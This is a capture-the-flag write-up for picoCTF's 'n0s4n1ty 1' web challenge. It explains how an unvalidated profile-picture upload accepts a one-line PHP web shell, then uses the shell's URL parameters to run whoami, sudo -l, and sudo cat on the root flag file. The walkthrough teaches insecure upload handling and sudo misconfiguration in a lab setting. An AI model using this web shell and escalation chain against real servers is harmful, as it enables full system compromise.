# picoCTF: n0s4n1ty 1

> **Category**: Web Exploitation  
> **Challenge URL**: [http://standard-pizzas.picoctf.net:50934/](http://standard-pizzas.picoctf.net:50934/)  
> **Objective**: Exploit the profile picture upload feature to gain shell access and read the flag from `/root/flag.txt`.

---

## ğŸš© Challenge Summary

This challenge involves exploiting an insecure file upload functionality to gain a web shell and eventually read a protected flag using privilege escalation.

---

## ğŸ” Walkthrough

### 1. ğŸ” Analyzing the Upload Feature

- The website allows profile picture uploads.
- There's no validation on the file type or extension.
- That means arbitrary files, including `.php` scripts, can be uploaded.

---

### 2. ğŸ’£ Creating the Web Shell

Create a file named `shell.php` with the following contents:

<?php system($_GET['cmd']); ?>

This shell executes any command passed via the cmd parameter.

3. ğŸ“¤ Uploading the Payload
Use the provided upload form to upload shell.php.

It should be accepted without any file extension restrictions.

After uploading, the shell is accessible at:

http://standard-pizzas.picoctf.net:50934/uploads/shell.php

4. ğŸ•¹ï¸ Confirming Shell Access
To test if the web shell works, visit:
http://standard-pizzas.picoctf.net:50934/uploads/shell.php?cmd=whoami

This command reveals the current user running the server process, likely www-data.

5. ğŸ§‘â€ğŸ’» Checking for Privilege Escalation
Try checking for sudo permissions:
http://standard-pizzas.picoctf.net:50934/uploads/shell.php?cmd=sudo -l

If the output shows something like:
(ALL) NOPASSWD: ALL

It means the current user can run all commands as root without needing a password.

6. ğŸ Retrieving the Flag
Now use the following commands via the web shell:

List contents of /root:
http://standard-pizzas.picoctf.net:50934/uploads/shell.php?cmd=sudo ls /root

Read the flag:
http://standard-pizzas.picoctf.net:50934/uploads/shell.php?cmd=sudo cat /root/flag.txt

ğŸ§  Useful Commands
Command	Purpose
whoami	Shows current web server user
sudo -l	Lists allowed sudo commands
sudo ls /root	Lists files in root's home directory
sudo cat /root/flag.txt	Reads the flag as root

âœ… Takeaways
Never trust user-uploaded files without proper validation.

Always check if you can upload executable code like .php or .jsp.

Poorly configured sudo privileges can lead to full system compromise.

Web shells are powerfulâ€”combine them with privilege escalation techniques.

Secure coding practices and permission hardening are essential.
